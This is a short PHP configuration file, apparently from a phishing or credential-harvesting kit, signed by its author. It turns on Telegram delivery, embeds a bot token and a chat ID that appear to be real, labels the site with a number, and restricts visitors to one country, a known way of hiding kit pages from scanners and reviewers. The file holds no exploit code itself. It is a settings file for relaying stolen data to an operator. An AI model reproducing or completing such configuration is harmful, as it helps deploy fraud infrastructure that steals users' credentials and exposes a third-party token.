<?php
/* 
  *  Coded by m4ntuoluo ❤️ 
  *
*/
$enableTelegram=True;
$BotTelegramToken="5626345555:AAFzbK-ZnSdOuK9hJJy0gEGvoZQT2iK1vP0"; // Fill in the ID of the telegram bot here
$IdTelegram=array("-847333110"); // Fill in your Telegram account ID here
$webnumb="NUM1";
$allowedcountry="US"; // Fill in the allowed countries here，But you need to delete the .htaccess file in the root directory
?>
